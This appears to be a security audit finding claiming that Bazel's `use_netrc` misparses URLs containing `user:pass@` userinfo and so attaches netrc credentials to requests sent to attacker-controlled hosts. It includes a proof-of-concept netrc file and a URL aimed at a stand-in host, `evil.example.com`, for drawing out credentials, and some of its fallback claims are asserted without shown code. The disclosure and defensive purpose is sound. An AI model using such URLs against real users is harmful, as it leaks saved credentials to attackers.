### Title
`use_netrc` host parsing misidentifies the authority in userinfo-bearing URLs, leaking netrc credentials to attacker-controlled hosts - (File: tools/build_defs/repo/utils.bzl)

### Summary
`use_netrc` in `tools/build_defs/repo/utils.bzl` derives the "host" for netrc/credential matching with a naive string split instead of proper URL/authority parsing, exactly the class of bug described in the `lambdaisland/uri` `authority-regex` advisory (CVE-2023-28628): a URL containing userinfo delimiters is misparsed, so the component used for a security decision (which credentials to attach) diverges from the actual network destination.

### Finding Description
`use_netrc` computes the host like this: [1](#0-0) 

```
host = schemerest[1].split("/")[0].split(":")[0]
```

This code strips the scheme, then takes everything up to the first `/` as the "authority", then takes everything up to the first `:` as the "host" — it never strips a userinfo component (`user:pass@host`). For a URL such as `https://user:pass@evil.com/malicious`, `schemerest[1]` is `user:pass@evil.com/malicious`; after `split("/")[0]` it is `user:pass@evil.com`; after `split(":")[0]` the computed "host" becomes `user`, not `evil.com`. Meanwhile the actual HTTP client that performs the download parses `evil.com` as the real connection target (userinfo is not part of the hostname per RFC 3986). This is the same invariant violation as the reported advisory: the naive regex/string-split used for a security-relevant authority decision disagrees with the authority the underlying network stack actually uses.

If the user (or an automatically generated `http_archive`/registry-provided archive spec) has a `.netrc` file with a default entry (`machine` line without a name, called the empty-string `""` fallback in `parse_netrc`/`read_netrc`, `tools/build_defs/repo/utils.bzl:417-426`) or with a literal machine entry that happens to collide with the misparsed token, `use_netrc` will attach that machine's login/password/auth pattern to the request: [2](#0-1) 

Because `get_auth`/`use_netrc` is called directly from `http_archive`, `http_file`, and `http_jar` with attacker-influenceable `urls` (e.g., an `http_archive` mirror list, or a URL supplied via a Bazel registry's `source.json`/module extension), an unprivileged attacker who controls one of the candidate download URLs can cause Bazel to send netrc-derived Basic Auth or `auth_patterns`-derived Authorization headers (e.g., a Bearer token) to the attacker's own server: [3](#0-2) 

### Impact Explanation
If the victim's default-machine (empty-string) netrc entry exists, or any netrc machine name coincidentally equals the userinfo substring an attacker chooses, the attacker-controlled server ends up receiving the victim's saved login/password or bearer token in the `Authorization` header. This is credential exfiltration to an attacker-controlled host, and it happens because the security decision ("does this URL's host match a netrc-registered machine and deserve credentials?") is based on a different parse of the authority than the one the actual HTTP layer uses to route the request — the exact "wrong authority" bug class in the report.

### Likelihood Explanation
Exploitability requires: (1) the victim's `.netrc` contains a default entry or a machine name matching the attacker's chosen userinfo token, and (2) the attacker can inject a URL with `user:pass@host` syntax into one of the URL lists Bazel fetches (a plausible attacker-published-content vector: an untrusted mirror URL, a malicious registry `source.json` entry, or a hostile branch's `http_archive` call in a review flow). This is a real but conditional/medium-likelihood scenario — the "default machine" case is the most straightforward trigger since many CI/dev setups configure a catch-all netrc credential.

### Recommendation
Rewrite the host-extraction logic in `use_netrc` to correctly discard any userinfo component before matching (i.e., split on the *last* `@` in the authority segment before taking the host/port), matching the WHATWG URL/RFC 3986 authority-parsing rules, and add regression tests with URLs containing `user:pass@host`, `\`-obfuscated authorities, and other authority-confusable payloads (mirroring the PoC used against `lambdaisland/uri`).

### Proof of Concept
Given a user `.netrc`:
```
machine
login attacker_would_never_see_this
password super-secret-token
```
(the blank/default `machine` entry, parsed by `parse_netrc` into the `""` key)

and an `http_archive`/`http_file` URL list containing:
```
urls = ["https://user:pass@evil.example.com/payload.tar"]
```

`use_netrc(netrc, urls, {})` computes `host = "user"` (not `evil.example.com`), which is not `in netrc`, so it falls back to the default `""` entry and attaches the saved `password` as a Bearer/basic auth header to the request that Bazel's downloader actually sends to `evil.example.com` — leaking the secret to the attacker's server. This can be verified as a Starlark unit test invoking `use_netrc` directly (as already done in `src/test/shell/bazel/starlark_repository_test.sh:1621-1680`, extended with a userinfo-bearing URL) and asserting the resulting `auth[url]["password"]` is non-empty even though the URL's real host (`evil.example.com`) was never registered in the netrc file.
